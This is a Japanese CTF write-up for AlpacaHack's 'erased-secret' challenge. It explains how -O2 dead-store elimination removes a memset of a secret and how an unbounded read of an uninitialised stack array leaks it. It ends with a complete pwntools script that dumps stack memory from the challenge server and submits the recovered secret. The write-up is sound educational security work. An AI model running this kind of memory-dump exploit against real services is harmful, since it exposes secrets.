# erased-secret Writeup
<https://alpacahack.com/daily/challenges/erased-secret?month=2026-04>

## 1. 概要
本問題はC言語のコンパイラ最適化による挙動と未初期化変数を経由した情報漏洩（スタックの再利用）を利用して消去されたはずのシークレット値を復元する問題です．

## 2. 問題の分析

### ファイル構成
* `main.c`: プログラムのソースコード
* `chal`: コンパイル済みのバイナリ
* `flag.txt`: フラグファイル（サーバー上に存在）
* `Dockerfile` / `compose.yaml`: サーバーの実行環境設定

### ソースコードの確認（main.c）
プログラムの主な処理は以下の通りです．

1.  **シークレットの生成とハッシュ化**: `prepare` 関数内で `/dev/urandom` から32文字の16進数文字列（`secret`）を生成し，そのSHA256ハッシュ値を計算して画面に出力します．
2.  **シークレットの消去処理**: 関数終了前に `memset` を用いて `secret` を上書き消去しようと試みます．
3.  **スタック変数の確保と読み出し**: 続いて `challenge` 関数が呼ばれ，未初期化の配列 `u8 mem[0x100]` がスタック上に確保されます．ユーザーは `?` コマンドで `mem` の任意のインデックスの値を1バイトずつ読み取ることができます．
4.  **正誤判定**: `!` コマンドでシークレットを入力し，ハッシュ値が一致すれば `/flag.txt` の内容が出力されます．

## 3. 脆弱性と攻略方針

### 脆弱性
`prepare` 関数における `memset(secret, 0, SECRET_LEN);` などの消去処理が，コンパイル時の最適化オプション（`-O2`）によって「その後の処理に影響を与えない無駄なコード（Dead Store Elimination / CWE-14）」と判断され，バイナリから完全に削除されている点が最大の脆弱性です．これにより，`secret` の平文データがスタック上にそのまま残存します．

### 攻略方針：未初期化スタックのダンプ
1.  **メモリのダンプ**: `challenge` 関数の `mem` は未初期化であり，かつインデックスの境界チェックが行われません．`?` コマンドを利用してインデックスを広範囲（0から512など）に指定し，スタック上のデータをダンプします．
2.  **シークレットの探索**: ダンプしたメモリデータの中から32文字の16進数文字列を抽出し，SHA256ハッシュが最初に提示されたハッシュ値と一致するものを特定します．
3.  **解答の送信**: 特定したシークレットを `!` コマンドで送信し，フラグを取得します．

## 4. エクスプロイトコード

`pwntools` を利用してメモリをダンプし自動でシークレットを特定・送信するスクリプトを作成しました．
<https://github.com/shinya00000/ctf/blob/main/alpacahack/daily-2026-04/erased_secret/solve.ipynb>

```python
from pwn import *
import hashlib
import re

# 接続先設定
HOST = '34.170.146.252'
PORT = 36195

def solve():
    p = remote(HOST, PORT)

    # ハッシュ値の取得
    p.recvuntil(b'hash: ')
    target_hash = p.recvline().strip().decode()
    log.info(f"Target hash: {target_hash}")

    # メニューの読み飛ばし
    p.recvline()

    log.info("Dumping extended stack memory...")
    dumped_data = bytearray()
    
    # スタックを広範囲にスキャンしてダンプ
    for i in range(512):
        p.sendlineafter(b'choice: ', b'?')
        p.sendlineafter(b'index: ', str(i).encode())
        p.recvuntil(f"mem[{i}] = 0x".encode())
        val = int(p.recvline().strip(), 16)
        dumped_data.append(val)
        
        if (i + 1) % 64 == 0:
            log.info(f"Dumped {i + 1}/512 bytes...")

    # 32バイトの16進数文字列を検索
    matches = re.findall(b'[0-9a-f]{32}', dumped_data)
    
    secret = None
    for match in matches:
        if hashlib.sha256(match).hexdigest() == target_hash:
            secret = match
            break

    if not secret:
        log.error("Secret not found. Please increase the search range.")
        return

    log.success(f"Found secret: {secret.decode()}")

    # 解答の送信
    p.sendlineafter(b'choice: ', b'!')
    p.sendlineafter(b'secret: ', secret)

    # フラグの取得
    print(p.recvall().decode(errors='ignore'))

if __name__ == '__main__':
    solve()